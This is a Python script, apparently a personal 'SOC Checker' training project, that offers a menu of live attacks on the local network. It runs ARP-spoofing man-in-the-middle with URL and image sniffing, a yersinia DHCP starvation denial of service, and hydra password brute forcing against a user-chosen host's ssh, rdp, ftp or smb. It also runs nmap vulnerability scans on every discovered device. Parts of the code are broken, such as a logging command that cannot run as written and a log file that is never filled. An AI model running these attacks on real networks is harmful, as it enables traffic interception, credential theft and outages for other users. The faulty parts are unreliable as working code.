#!/usr/bin/env python3

"""
Guy Evenchen SOC Project script v1 - SOC CHECKER

Copyright © Guy Evenchen 2023

All rights reserved. This script is the intellectual property of Guy Evenchen. 
You may use, modify, and distribute this script for educational and non-commercial purposes only. 
Any unauthorized use, reproduction, or distribution is strictly prohibited. 
Guy Evenchen assumes no responsibility for any damages or liabilities arising from the use of this script.

For inquiries, please contact https://www.linkedin.com/in/guy-evenchen/.
"""

import os
import subprocess
import time

# Function to scan for vulnerabilities using arp-scan and nmap
def vuln_scan():
    print("\033[31m" + subprocess.getoutput("figlet vulnerability") + "\033[0m")
    log_file_nmap = "/var/log/Nmap_scanned.log"

    local_ip = subprocess.getoutput("ip -4 addr show eth0 | grep -oP 'inet \K[\d.]+' | head -1")
    default_gateway = subprocess.getoutput("ip route | grep default | awk '{print $3}'")

    print("[*] Running vulnerability Scan in the network [*]")
    time.sleep(1)
    print(f"[*] Your Local IP: {local_ip} [*]")
    print(f"[*] Your Default Gateway / Router IP: {default_gateway} [*]")
    time.sleep(2)
    print("[!] The Network connected IP'S / Devices to the network [!]")

    local_network = subprocess.getoutput("sudo arp-scan --localnet 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1, $2}'")
    print(local_network[local_network.find("\n")+1:])
    print()

    for line in local_network.split('\n')[1:]:
        ip, mac = line.split()
        print(f"[!] Checking vulnerabilities for: {ip} [!]")
        
        nmap_result = subprocess.getoutput(f"sudo nmap --script=vuln {ip}")
        cve_list = subprocess.getoutput(f"echo '{nmap_result}' | grep -oP 'CVE-\\d+-\\d+'")

        if cve_list:
            print(f"CVEs found: {cve_list}")
        else:
            print("No CVEs found.")

        with open(log_file_nmap, "a") as log_file:
            log_file.write(nmap_result + '\n')
            log_file.write(time.strftime("%Y-%m-%d %H:%M:%S") + '\n')

# Function to perform MITM attack
def mitm_attack():
    log_file_mitm = "/var/log/mitm_sniffed_list.txt"

    print("\033[31m" + subprocess.getoutput("figlet MITM") + "\033[0m")

    subprocess.run(["sudo", "apt", "install", "dsniff"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "apt", "install", "driftnet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    local_ip = subprocess.getoutput("ip -4 addr show eth0 | grep -oP 'inet \K[\d.]+' | head -1")
    default_gateway = subprocess.getoutput("ip route | grep default | awk '{print $3}'")

    print("[!] The Network IP'S and Devices that connected to the network:")
    local_network = subprocess.getoutput("sudo arp-scan --localnet 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1, $2}'")
    print(local_network[local_network.find("\n")+1:])
    print()

    attacked_ip = input("Please choose the attacked IP address to start the MITM: ")
    print(f"[!] The Local IP: {local_ip}")
    time.sleep(1)
    print(f"[!] The Router IP: {default_gateway}")
    time.sleep(1)
    print(f"[!] The Attacked IP: {attacked_ip}")
    time.sleep(2)

    print("[!] Start Sniffing the Network 🕵️👃💨 ")
    time.sleep(1)

    subprocess.Popen(["sudo", "arpspoof", "-t", attacked_ip, local_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["sudo", "arpspoof", "-t", default_gateway, local_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(["sudo", "urlsnarf", "-i", "eth0"])
    subprocess.Popen(["sudo", "driftnet", "-i", "eth0"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL).communicate()[0]
    input("[!] Press Enter to stop the MITM attack [!]\n")

    subprocess.run(["sudo", "pkill", "arpspoof"])
    subprocess.run(["sudo", "pkill", "urlsnarf"])
    subprocess.run(["sudo", "pkill", "driftnet"])

    print(f"Attack log saved to: {log_file_mitm}")
    time.sleep(1)
    print("Going back to Main Menu .. ")
    time.sleep(2)

# Function to perform DDOS attack
def ddos_attack():
    print("\033[31m" + subprocess.getoutput("figlet DDOS") + "\033[0m")

    print("[!] To use the tool after it opens:\n1. Press -> \"X\"\n2. Then -> \"F2\"\n3. Press \"X\" again\n4. Lastly, select -> \"1\" for DHCP Discover Packets\nTo exit, press \"Q\".")

    time.sleep(10)
    subprocess.run(["sudo", "apt", "install", "hping3"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "apt-get", "install", "yersinia"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    local_network = subprocess.getoutput("sudo arp-scan --localnet 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1, $2}'")
    subprocess.run(["echo", local_network[local_network.find("\n")+1:], "| awk '{print $1}' | date | echo \"DDOS\" >> /var/log/ddos_source_ip_list.log"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(2)

    print("Trying to do DHCP / DDOS Attack to a random IP in your network ..")

    subprocess.run(["sudo", "yersinia", "-I"])

    print("Going back to Main Menu .. ")
    time.sleep(2)

# Function to perform Brute Force attack
def brute_force():
    log_file_bf = "/var/log/hydra_attack.log"

    print("\033[31m" + subprocess.getoutput("figlet Brute Force") + "\033[0m")

    local_network = subprocess.getoutput("sudo arp-scan --localnet 2>/dev/null | awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1, $2}'")
    local_ip = subprocess.getoutput("ip -4 addr show eth0 | grep -oP 'inet \K[\d.]+' | head -1")

    print(f"Your Local IP Address is: {local_ip}")
    time.sleep(1)
    print(f"[!] Local Network IP addresses and MAC addresses:\n{local_network[local_network.find('\n')+1:]}")
    time.sleep(1)
    print()

    attacked_ip = input("[*] Please Enter the IP Address of your local network you want to attack: ")
    time.sleep(1)
    password_path_list = input("Please Enter the Password List Path: ")
    time.sleep(1)
    service = input("Please choose your preferred service [ssh / rdp / ftp / smb]: ")
    time.sleep(1)
    username = input("Please Enter the Attacked Username: ")
    time.sleep(1)

    subprocess.run(["sudo", "hydra", "-l", username, "-P", password_path_list, "-t", "3", f"{service}://{attacked_ip}"], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)

    print(f"Attack log saved to: {log_file_bf}")
    time.sleep(1)
    print("Going back to Main Menu .. ")
    time.sleep(2)

# Main menu function
def main_menu():
    if os.geteuid() != 0:
        print("Please run the script as root - using sudo su/sudo")
        exit(1)

    print("\033[31m" + subprocess.getoutput("figlet SOC CHECKER") + "\033[0m")
    time.sleep(1)
    print("Copyrights: Guy Evenchen ®️- Project Script v1.2")
    time.sleep(1)

    subprocess.run(["sudo", "apt-get", "install", "arp-scan"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "apt", "install", "dsniff"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    local_ip_main = subprocess.getoutput("ip -4 addr show eth0 | grep -oP 'inet \K[\d.]+' | head -1")
    time.sleep(1)
    print(f"-- Your IP Address in this Local Network is: {local_ip_main} --")

    print("\033[31m" + subprocess.getoutput("figlet Menu") + "\033[0m")
    while True:
        print("[?] Choose an attack option:")
        print("\033[33m[1] ⇉ Brute Force Attack💪🏻\033[0m")
        print("\033[33m[2] ⇉ DHCP Starvation Attack (DDOS)🍽️\033[0m")
        print("\033[33m[3] ⇉ MITM Attack👤👤👤\033[0m")
        print("\033[33m[4] ⇉ vulnerability/cve Scanner🕵🏻\033[0m")
        print("\033[33m[5] ⇉ Attack Descriptions📄\033[0m")
        print("\033[33m[6] ⇉ Copyright ©\033[0m")
        print("\033[33m[7] ⇉ Exit Script 👋\033[0m")

        choice = input("[*] Please select option (1/2/3/4/5/6/7): ")

        if choice == '1':
            print("[!] You selected Option [1] Performing ⇉➤ Brute Force Attack [!]")
            time.sleep(2)
            brute_force()
        elif choice == '2':
            print("[!] You selected Option [2] Performing ⇉➤ DDOS Attack [!]")
            time.sleep(2)
            ddos_attack()
        elif choice == '3':
            print("[!] You selected Option [3] Performing ⇉➤ MITM Attack [!]")
            time.sleep(2)
            mitm_attack()
        elif choice == '4':
            print("[!] You selected Option [4] Performing ⇉➤ vulnerability Scanner [!]")
            time.sleep(2)
            vuln_scan()
        elif choice == '5':
            print("[!] You selected Option [5] Descriptions 📄 (closing in 1 Minute) [!]")
            print("[?] Brute Force | A Brute Force Attack is like a digital burglar 🥷🏾 trying every key in the neighborhood until they find the one that unlocks 🔓 the door.🚪 \n In this method, attackers systematically attempt all possible combinations of usernames and passwords until they discover 🔎 the correct credentials.🪪 \n It's a straightforward but time-consuming approach that relies on sheer computing power to break through security 👮🏻‍♂️ measures and gain unauthorized access.")
            print("[?] DHCP Starvation Attack | Imagine 🤔 a traffic jam 🚦🚗 🚙🚌__ on the information highway. A Distributed Denial of Service (DDoS) attack 🤺 is like maliciously clogging up a network, service, or website 🌐 with an overwhelming flood of internet traffic. \n The aim 🎯 is to render the target inaccessible, causing downtime and potential financial losses 💲")
            print("[?] MITM | Picture an invisible eavesdropper 🦻🏼 at a private conversation 🗣 \n A Man-in-the-Middle 🙋🏻‍♂️ (MITM) Attack is a cyber attack where an unauthorized third party intercepts and potentially alters communication between two parties without their knowledge.🧠 \n The attacker secretly relays and may manipulate the information exchanged between the victims, gaining access to sensitive data. 📂")
            time.sleep(60)
        elif choice == '6':
            print("[!] You selected Option [6] Copyright © [!]")
            time.sleep(1)
            print("\nCopyright © Guy Evenchen\n\nAll rights reserved. This script is the intellectual property of Guy E.\nYou may use, modify, and distribute this script for educational and non-commercial purposes only. \nAny unauthorized use, reproduction, or distribution is strictly prohibited. Guy  assumes no responsibility for any damages or liabilities arising from the use of this script.")
            print("For inquiries, please contact https://www.linkedin.com/in/guy-evenchen/ , https://github.com/Evenchen21 .")
            time.sleep(10)
        elif choice == '7':
            print("[!] You selected Option [7] Exiting the Script.. 😭 [!]")
            time.sleep(1)
            print("\033[31m" + subprocess.getoutput("figlet BYE !") + "\033[0m")
            exit()
        else:
            print("🚫 Invalid Choice.. Exiting Script❕🚫 ")
            time.sleep(2)
            exit()

if __name__ == "__main__":
    main_menu()
